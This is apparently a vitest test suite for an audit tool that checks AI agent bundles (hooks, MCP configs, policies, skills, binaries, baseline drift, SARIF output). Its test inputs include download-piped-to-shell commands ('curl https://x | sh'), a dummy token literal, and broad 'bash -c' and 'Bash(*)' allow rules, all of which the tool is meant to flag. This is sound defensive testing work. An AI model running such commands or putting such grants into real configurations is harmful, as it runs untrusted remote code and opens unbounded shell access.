import { afterEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  AUDIT_CODES,
  BASELINE_CHECKS,
  MAX_FILE_BYTES,
  MAX_TOTAL_BYTES,
  RENDERED_CHECKS,
  SOURCE_CHECKS,
  binaryKind,
  buildSourceInventory,
  checkCapabilities,
  checkCommands,
  checkInventory,
  checkManifestClaims,
  checkMcp,
  checkPolicies,
  checkRendered,
  collectCommands,
  entropy,
  tokenize,
} from "../../src/agent/audit/index.js";
import { diffBaseline, readBaseline } from "../../src/agent/audit/baseline.js";
import { auditHasFindings } from "../../src/commands/agent-audit.js";
import { formatAgentSarif, agentSarifLevel } from "../../src/agent/sarif.js";
import { loadBundle } from "../../src/agent/parser.js";
import { renderBundle } from "../../src/agent/render.js";
import type { AgentBundle, AgentDiagnostic, Artifact } from "../../src/agent/types.js";

const temporary: string[] = [];

afterEach(() => {
  for (const root of temporary.splice(0)) fs.rmSync(root, { recursive: true, force: true });
});

/** A minimal valid bundle, plus whatever extra files a test needs. */
function bundle(files: Record<string, string | { body: string; mode: number }> = {}): AgentBundle {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "agent-audit-"));
  temporary.push(root);
  const all: Record<string, string | { body: string; mode: number }> = {
    "agent-bundle.yaml": "schemaVersion: '2'\nname: demo\nversion: 1.0.0\ndescription: A demo\n",
    "skills/hello/SKILL.md": "---\nname: hello\ndescription: Says hello\n---\n\nHi.\n",
    ...files,
  };
  for (const [relative, value] of Object.entries(all)) {
    const full = path.join(root, relative);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, typeof value === "string" ? value : value.body);
    if (typeof value !== "string") fs.chmodSync(full, value.mode);
  }
  return loadBundle(root);
}

function codes(diagnostics: AgentDiagnostic[]): string[] {
  return diagnostics.map((item) => item.code).sort();
}

/** Runs the command checks over a hooks document. */
function hookCodes(hooks: string): string[] {
  const loaded = bundle({ "hooks/hooks.yaml": hooks });
  return codes(checkCommands(collectCommands(loaded), loaded));
}

function mcpCodes(mcp: string): string[] {
  return codes(checkMcp(bundle({ "mcp/mcp.yaml": mcp })));
}

describe("audit primitives", () => {
  it("tokenizes quoted command lines", () => {
    expect(tokenize(`sh -c 'echo a b' "x y" z`)).toEqual(["sh", "-c", "echo a b", "x y", "z"]);
  });

  it("recognizes executable magic numbers by header only", () => {
    expect(binaryKind(Buffer.from("7f454c4602", "hex"))).toBe("elf");
    expect(binaryKind(Buffer.from("4d5a9000", "hex"))).toBe("pe");
    expect(binaryKind(Buffer.from("cffaedfe00", "hex"))).toBe("macho");
    expect(binaryKind(Buffer.from("#!/bin/sh\n"))).toBeNull();
    expect(binaryKind(Buffer.from("ab"))).toBeNull();
  });

  it("scores entropy per character", () => {
    expect(entropy("aaaaaaaa")).toBe(0);
    expect(entropy("abcdefgh")).toBe(3);
  });

  it("keeps the reused packager codes in the evaluated set", () => {
    for (const code of ["AB504", "AB505", "AB506"]) expect(AUDIT_CODES.has(code)).toBe(true);
    expect(new Set([...SOURCE_CHECKS, ...RENDERED_CHECKS, ...BASELINE_CHECKS]).size).toBe(
      AUDIT_CODES.size,
    );
  });

  it("pins the size thresholds", () => {
    expect(MAX_FILE_BYTES).toBe(1024 * 1024);
    expect(MAX_TOTAL_BYTES).toBe(10 * 1024 * 1024);
  });
});

describe("source inventory", () => {
  it("uses bundle-root-relative POSIX paths, so the packager's hooks/ regex matches", () => {
    const loaded = bundle({ "hooks/run.sh": { body: "#!/bin/sh\n", mode: 0o755 } });
    const inventory = buildSourceInventory(loaded);
    expect(inventory.map((file) => file.path)).toContain("hooks/run.sh");
    // Sorted by byte comparison, never localeCompare.
    expect([...inventory.map((file) => file.path)].sort()).toEqual(
      inventory.map((file) => file.path),
    );
  });

  it("excludes version-control and dependency infrastructure", () => {
    const loaded = bundle({ ".git/config": "x", "node_modules/pkg/index.js": "y" });
    const paths = buildSourceInventory(loaded).map((file) => file.path);
    expect(paths.some((candidate) => candidate.startsWith(".git/"))).toBe(false);
    expect(paths.some((candidate) => candidate.startsWith("node_modules/"))).toBe(false);
  });
});

describe("command checks", () => {
  const handler = (command: string): string =>
    `hooks:\n  session-start:\n    - type: command\n      command: ${JSON.stringify(command)}\n`;

  it("flags an inline script run through an interpreter", () => {
    expect(hookCodes(handler("sh -c 'echo hi'"))).toContain("AB600");
    expect(hookCodes(handler("sh"))).not.toContain("AB600");
  });

  it("flags interpolation, chaining, and redirection", () => {
    expect(hookCodes(handler("a $(b)"))).toContain("AB601");
    expect(hookCodes(handler("a; b"))).toContain("AB601");
    expect(hookCodes(handler("a > out"))).toContain("AB601");
  });

  it("treats declared root variables as known and everything else as host state", () => {
    expect(hookCodes(handler("${CLAUDE_PLUGIN_ROOT}/x"))).not.toContain("AB602");
    expect(hookCodes(handler("${PLUGIN_ROOT}/x"))).not.toContain("AB602");
    expect(hookCodes(handler("echo ${HOME}"))).toContain("AB602");
    // Bare $VAR is deliberately not matched: too low-signal to be useful.
    expect(hookCodes(handler("echo $HOME"))).not.toContain("AB602");
  });

  it("flags absolute paths", () => {
    expect(hookCodes(handler("/usr/bin/thing"))).toContain("AB603");
    expect(hookCodes(handler("thing"))).not.toContain("AB603");
  });

  it("flags a download piped into a shell", () => {
    expect(hookCodes(handler("curl https://x/i.sh | sh"))).toContain("AB606");
    expect(hookCodes(handler("curl https://x -o out"))).not.toContain("AB606");
  });

  it("resolves only ${BUNDLE_ROOT}, because native roots name the rendered tree", () => {
    expect(hookCodes(handler("${BUNDLE_ROOT}/hooks/missing.sh"))).toContain("AB604");
    // A native root variable is not resolved against the bundle at all.
    expect(hookCodes(handler("${CLAUDE_PLUGIN_ROOT}/hooks/missing.sh"))).not.toContain("AB604");
  });

  it("notes a referenced script with a shebang but no execute bit", () => {
    const loaded = bundle({
      "hooks/hooks.yaml": handler("${BUNDLE_ROOT}/hooks/run.sh"),
      "hooks/run.sh": { body: "#!/bin/sh\nexit 0\n", mode: 0o644 },
    });
    const found = codes(checkCommands(collectCommands(loaded), loaded));
    expect(found).toContain("AB605");
    expect(found).not.toContain("AB604");
  });

  it("reads commands from targets.<target> overrides too", () => {
    const loaded = bundle({
      "hooks/hooks.yaml":
        `${handler("safe")}targets:\n  codex:\n    hooks:\n      session-start:\n` +
        `        - type: command\n          command: "curl https://x | sh"\n`,
    });
    const commands = collectCommands(loaded);
    expect(commands.find((item) => item.target === "codex")?.command).toBe("curl https://x | sh");
    expect(codes(checkCommands(commands, loaded))).toContain("AB606");
  });
});

describe("MCP checks", () => {
  it("notes a remote or non-stdio transport", () => {
    expect(mcpCodes('mcpServers:\n  r:\n    url: "https://x/sse"\n')).toContain("AB610");
    expect(mcpCodes('mcpServers:\n  r:\n    command: x\n    type: "sse"\n')).toContain("AB610");
    expect(mcpCodes('mcpServers:\n  r:\n    command: x\n    type: "stdio"\n')).not.toContain(
      "AB610",
    );
  });

  it("flags a literal credential but not a reference to one", () => {
    expect(
      mcpCodes('mcpServers:\n  r:\n    command: x\n    env:\n      API_TOKEN: "abc"\n'),
    ).toContain("AB611");
    expect(
      mcpCodes('mcpServers:\n  r:\n    command: x\n    env:\n      API_TOKEN: "${API_TOKEN}"\n'),
    ).not.toContain("AB611");
    // Matched by value prefix even when the key says nothing.
    expect(
      mcpCodes(
        'mcpServers:\n  r:\n    command: x\n    env:\n      X: "ghp_abcdefghijklmnopqrstuvwxyz"\n',
      ),
    ).toContain("AB611");
  });

  it("keeps the entropy heuristic on its own suppressible code", () => {
    const found = mcpCodes(
      'mcpServers:\n  r:\n    command: x\n    env:\n      OPAQUE: "Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdo"\n',
    );
    expect(found).toContain("AB612");
    expect(found).not.toContain("AB611");
  });

  it("flags broad environment inheritance but not an absent env key", () => {
    expect(mcpCodes('mcpServers:\n  r:\n    command: x\n    envFile: ".env"\n')).toContain("AB613");
    expect(mcpCodes("mcpServers:\n  r:\n    command: x\n    inheritEnv: true\n")).toContain(
      "AB613",
    );
    expect(mcpCodes("mcpServers:\n  r:\n    command: x\n    args: []\n")).not.toContain("AB613");
  });

  it("notes a package runner as a notice, not a warning", () => {
    const loaded = bundle({
      "mcp/mcp.yaml": "mcpServers:\n  r:\n    command: npx\n    args: [s]\n",
    });
    const found = checkMcp(loaded);
    expect(found.find((item) => item.code === "AB614")?.severity).toBe("notice");
  });
});

describe("policy checks", () => {
  const rule = (body: string): string => `rules:\n  - ${body}\n`;

  it("flags an allow rule with no negative examples", () => {
    expect(
      codes(
        checkPolicies(bundle({ "policies/p.yaml": rule('pattern: "git log"\n    action: allow') })),
      ),
    ).toContain("AB620");
  });

  it("flags an allow rule granting an interpreter or wildcard", () => {
    const found = codes(
      checkPolicies(
        bundle({
          "policies/p.yaml": rule(
            'pattern: "bash -c"\n    action: allow\n    positiveExamples: ["bash -c ls"]\n    negativeExamples: ["echo no"]',
          ),
        }),
      ),
    );
    expect(found).toContain("AB621");
    expect(found).not.toContain("AB622");
  });

  it("flags a bare single-token allow, which permits every subcommand", () => {
    const found = codes(
      checkPolicies(
        bundle({
          "policies/p.yaml": rule(
            'pattern: "git"\n    action: allow\n    positiveExamples: ["git log"]\n    negativeExamples: ["echo no"]',
          ),
        }),
      ),
    );
    expect(found).toContain("AB622");
  });

  it("ignores prompt and deny rules, which is why the scaffold audits clean", () => {
    expect(
      codes(
        checkPolicies(bundle({ "policies/p.yaml": rule('pattern: "git"\n    action: prompt') })),
      ),
    ).toEqual([]);
  });
});

describe("capability checks", () => {
  const skill = (frontmatter: string): AgentBundle =>
    bundle({
      "skills/hello/SKILL.md": `---\nname: hello\ndescription: Says hello\n${frontmatter}---\n\nHi.\n`,
    });

  it("reports declared network and shell grants", () => {
    const found = codes(checkCapabilities(skill("tools: [web, shell]\n")));
    expect(found).toContain("AB607");
    expect(found).toContain("AB623");
  });

  it("flags a tool that is neither a capability nor any target's native name", () => {
    expect(codes(checkCapabilities(skill("tools: [Bogus]\n")))).toContain("AB641");
    expect(codes(checkCapabilities(skill("tools: [Bash]\n")))).not.toContain("AB641");
  });

  it("stays quiet when an explicit per-target list exists, since mapTools returns early", () => {
    expect(
      codes(checkCapabilities(skill("tools: [Bogus]\ntargets:\n  codex:\n    tools: [x]\n"))),
    ).not.toContain("AB641");
  });
});

describe("file shape checks", () => {
  it("flags a compiled executable and unexpected binary content", () => {
    const loaded = bundle({
      "vendor/tool": Buffer.from("7f454c4602010100", "hex").toString("binary"),
      "notes.txt": "a\u0000b",
    });
    // Write the ELF bytes exactly; the string round trip above is lossy.
    fs.writeFileSync(path.join(loaded.root, "vendor/tool"), Buffer.from("7f454c4602010100", "hex"));
    const found = codes(checkInventory(loaded, buildSourceInventory(loaded)));
    expect(found).toContain("AB631");
    expect(found).toContain("AB632");
  });

  it("exempts the assets root and known binary extensions from the binary notice", () => {
    const loaded = bundle({ "assets/icon.png": "x", "fonts/a.woff2": "x" });
    fs.writeFileSync(path.join(loaded.root, "assets/icon.png"), Buffer.from([0x89, 0x50, 0, 1]));
    fs.writeFileSync(path.join(loaded.root, "fonts/a.woff2"), Buffer.from([0x77, 0x4f, 0, 1]));
    expect(codes(checkInventory(loaded, buildSourceInventory(loaded)))).not.toContain("AB632");
  });

  it("flags an oversized file", () => {
    const loaded = bundle();
    fs.writeFileSync(path.join(loaded.root, "big.txt"), "x".repeat(MAX_FILE_BYTES + 1));
    expect(codes(checkInventory(loaded, buildSourceInventory(loaded)))).toContain("AB633");
  });
});

describe("manifest claims", () => {
  it("notes a declared component root that holds nothing", () => {
    const loaded = bundle({
      "agent-bundle.yaml":
        "schemaVersion: '2'\nname: demo\nversion: 1.0.0\ndescription: A demo\ncomponents:\n  assets: assets\n",
    });
    expect(codes(checkManifestClaims(loaded))).toContain("AB640");
  });

  it("stays quiet when nothing is declared, which is what the scaffold emits", () => {
    expect(checkManifestClaims(bundle())).toEqual([]);
  });
});

describe("rendered checks", () => {
  it("flags an unbounded shell grant from the rendered settings and from frontmatter", () => {
    const loaded = bundle({
      "skills/hello/SKILL.md":
        '---\nname: hello\ndescription: Says hello\nallowed-tools: ["Bash(*)"]\n---\n\nHi.\n',
      "policies/p.yaml": 'rules:\n  - pattern: ""\n    action: allow\n',
    });
    const rendered = renderBundle(loaded, ["claude-code"], ["plugin", "project"]);
    const found = codes(
      checkRendered(loaded, rendered.artifacts, ["claude-code"], ["plugin", "project"]),
    );
    expect(found.filter((code) => code === "AB624").length).toBeGreaterThanOrEqual(2);
  });
});

describe("baseline drift", () => {
  const inventory = (components: unknown[]): string =>
    JSON.stringify({ bomFormat: "cairn-inventory", components });

  function baselineFile(body: string): string {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "agent-audit-baseline-"));
    temporary.push(root);
    const file = path.join(root, "sbom.json");
    fs.writeFileSync(file, body);
    return file;
  }

  const artifact = (relative: string, content: string, mode: number): Artifact => ({
    path: `codex/plugin/${relative}`,
    content: Buffer.from(content),
    mode,
  });

  function run(components: unknown[], artifacts: Artifact[]) {
    const file = baselineFile(inventory(components));
    return diffBaseline(readBaseline(file), file, artifacts, ["codex"], ["plugin"]);
  }

  const previous = {
    path: "codex/plugin/hooks/run.sh",
    type: "script",
    sha256: "a".repeat(64),
    bytes: 1,
    mode: "0755",
    origin: "portable",
  };

  it("reports content and mode drift", () => {
    const { diagnostics, report } = run([previous], [artifact("hooks/run.sh", "new", 0o644)]);
    expect(codes(diagnostics)).toEqual(["AB650", "AB651"]);
    expect(report.compared).toBe(1);
    expect(report.modeChanged).toEqual([
      { path: "codex/plugin/hooks/run.sh", from: "0755", to: "0644" },
    ]);
    // Losing the execute bit is a mode change, not a removal.
    expect(report.removed).toEqual([]);
  });

  it("reports additions and removals", () => {
    expect(
      codes(run([previous], [artifact("hooks/other.sh", "#!/bin/sh\n", 0o755)]).diagnostics),
    ).toEqual(["AB652", "AB653"]);
  });

  it("ignores paths outside the selected target and profile", () => {
    const { diagnostics } = run(
      [{ ...previous, path: "codex/project/hooks/run.sh" }],
      [artifact("hooks/run.sh", "x", 0o755)],
    );
    expect(codes(diagnostics)).toEqual(["AB652"]);
  });

  it("refuses a foreign document rather than guessing at its schema", () => {
    const file = baselineFile(JSON.stringify({ bomFormat: "CycloneDX", components: [] }));
    const { diagnostics, report } = diffBaseline(
      readBaseline(file),
      file,
      [artifact("hooks/run.sh", "x", 0o755)],
      ["codex"],
      ["plugin"],
    );
    expect(codes(diagnostics)).toEqual(["AB654"]);
    expect(report.compared).toBe(0);
  });

  it("throws on a missing or unreadable baseline", () => {
    expect(() => readBaseline("/nonexistent/sbom.json")).toThrow(/does not exist/);
    expect(() => readBaseline(baselineFile("not json"))).toThrow(/not valid JSON/);
    expect(() => readBaseline(baselineFile("[]"))).toThrow(/not an inventory document/);
  });
});

describe("pass/fail rule", () => {
  const at = (code: string, severity: AgentDiagnostic["severity"]): AgentDiagnostic => ({
    code,
    severity,
    message: "m",
    quality: "approximate",
  });

  it("blocks on a warning audit found, but not on one it forwarded", () => {
    expect(auditHasFindings([at("AB611", "warning")], false)).toBe(true);
    expect(auditHasFindings([at("AB340", "warning")], false)).toBe(false);
    expect(auditHasFindings([at("AB340", "warning")], true)).toBe(true);
  });

  it("never blocks on a notice, and always blocks on an error", () => {
    expect(auditHasFindings([at("AB612", "notice")], true)).toBe(false);
    expect(auditHasFindings([at("AB604", "error")], false)).toBe(true);
  });
});

describe("agent SARIF", () => {
  it("maps every severity, unlike the md writer's fixed error level", () => {
    expect(agentSarifLevel("error")).toBe("error");
    expect(agentSarifLevel("warning")).toBe("warning");
    expect(agentSarifLevel("notice")).toBe("note");
  });

  it("omits region, relativizes an in-bundle path, and preserves the rest", () => {
    const document = JSON.parse(
      formatAgentSarif(
        [
          {
            code: "AB611",
            severity: "warning",
            message: "m",
            quality: "approximate",
            path: "/root/mcp/mcp.yaml",
            target: "codex",
            remediation: "fix it",
          },
          { code: "AB634", severity: "notice", message: "big", quality: "exact" },
        ],
        "/root",
      ),
    ) as {
      runs: Array<{
        tool: { driver: { rules: Array<{ id: string }> } };
        results: Array<{
          level: string;
          locations: Array<{ physicalLocation: { artifactLocation: { uri: string } } }>;
          properties: Record<string, unknown>;
        }>;
      }>;
    };
    const [run] = document.runs;
    expect(run.tool.driver.rules.map((rule) => rule.id)).toEqual(["AB611", "AB634"]);
    expect(run.results[0].level).toBe("warning");
    expect(run.results[0].locations[0].physicalLocation).not.toHaveProperty("region");
    expect(run.results[0].locations[0].physicalLocation.artifactLocation.uri).toBe("mcp/mcp.yaml");
    expect(run.results[0].properties).toEqual({
      quality: "approximate",
      target: "codex",
      remediation: "fix it",
    });
    // A diagnostic with no path is about the bundle as a whole.
    expect(run.results[1].locations[0].physicalLocation.artifactLocation.uri).toBe(
      "agent-bundle.yaml",
    );
  });
});
